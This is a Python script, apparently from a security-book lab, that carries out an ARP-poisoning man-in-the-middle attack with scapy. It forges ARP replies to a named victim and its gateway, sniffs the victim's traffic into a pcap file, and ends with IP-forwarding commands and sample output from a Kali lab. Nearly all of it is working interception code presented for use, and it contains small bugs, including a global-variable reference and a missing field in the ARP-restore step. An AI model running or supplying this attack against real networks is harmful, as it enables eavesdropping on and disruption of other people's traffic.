from multiprocessing import Process 
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)

import os 
import sys
import time

def get_mac(targetip):
	packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
	resp, _ =srp(packet, timeout = 2, retry=10, verbose=False)
	for _,r in resp:
		return r[Ether].src 
	return None

class Arper:
	def __init__(self, victim, gateway, interface='en0'):
		self.victim = victim
		self.victimmac = get_mac(victim)
		self.gateway = gateway
		self.gatewaymac = get_mac(gateway)
		self.interface = interface
		conf.iface = interface
		conf.verb = 0

		print(f'Initialized {interface}:')
		print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
		print(f'Victim ({victim}) is at {self.victimmac}.')
		print('-'*30)


	def run(self):
		self.poison_thread = Process(target = self.poison)
		self.poison_thread.start()

		self.sniff_thread = Process(target = self.sniff)
		self.sniff_thread.start()


	def poison(self):
		poison_victim = ARP()
		poison_victim.op = 2
		poison_victim.psrc = self.gateway
		poison_victim.pdst = self.victim
		poison_victim.hwdst = self.victimmac
		print(f'ip src: {poison_victim.psrc}')
		print(f'ip dst: {poison_victim.pdst}')
		print(f'mac dst: {poison_victim.hwdst}')
		print(f'mac src: {poison_victim.hwsrc}')
		print(poison_victim.summary())
		print('-'*30)

		poison_gateway = ARP()
		poison_gateway.op = 2 
		poison_gateway.psrc = self.victim
		poison_gateway.pdst = self.gateway
		poison_gateway.hwdst = self.gatewaymac

		print(f'ip src: {poison_gateway.psrc}')
		print(f'ip dst: {poison_gateway.pdst}')
		print(f'mac dst: {poison_gateway.hwdst}')
		print(f'mac_src: {poison_gateway.hwsrc}')
		print(poison_gateway.summary())
		print('-'*30)
		print(f'Beginning the ARP poison.[CTRL-C to stop]')

		while True:
			sys.stdout.write('.')
			sys.stdout.flush()
			try:
				send(poison_victim)
				send(poison_gateway)
			except KeyboardInterrupt:
				self.restore()
				sys.exit()
			else:
				time.sleep(2)




	def sniff(self, count=100):
		time.sleep(5)
		print(f'Sniffing {count} packets')
		bpf_filter = "ip host %s" %victim 
		packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
		wrpcap('arper.pcap', packets)
		print('Got the packet')
		self.restore()
		self.poison_thread.terminate()
		print('Finished.')

	def restore(self):
		print('Restoring ARP table...')
		send(ARP(op=2,
			psrc=self.gateway,
			hwsrc=self.gatewaymac,
			pdst=self.victim,
			hwdst='ff:ff:ff:ff:ff:ff'),
			count=5)
		send(ARP(op=2,
			psrc=self.victim,
			hwsrc=self.victimmac,
			hwdst='ff:ff:ff:ff:ff:ff'),
			count=5)

if __name__ == '__main__':
	(victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
	myarp = Arper(victim, gateway, interface)
	myarp.run()


"""
If you are on your Kali VM, enter the following command into your terminal:
#:> echo 1 > /proc/sys/net/ipv4/ip_forward
If you are an Apple fanatic, use the following command:
#:> sudo sysctl -w net.inet.ip.forwarding=1
Example of Output:
└─$ sudo python3 arper.py  192.168.80.174 192.168.80.168 eth0                                                                                                                           1 ⨯
Initialized eth0:
Gateway (192.168.80.168) is at 00:0c:29:81:cb:9c.
Victim (192.168.80.174) is at None.
------------------------------
ip src: 192.168.80.168
ip dst: 192.168.80.174
mac dst: 00:00:00:00:00:00
mac src: 00:00:00:00:00:00
ARP is at 00:00:00:00:00:00 says 192.168.80.168
------------------------------
ip src: 192.168.80.174
ip dst: 192.168.80.168
mac dst: 00:0c:29:81:cb:9c
mac_src: 00:0c:29:12:ba:9e
ARP is at 00:0c:29:12:ba:9e says 192.168.80.174
------------------------------
Beginning the ARP poison.[CTRL-C to stop]
...Sniffing 100 packets
....................................................................Got the packet
Restoring ARP table...
Finished.
"""
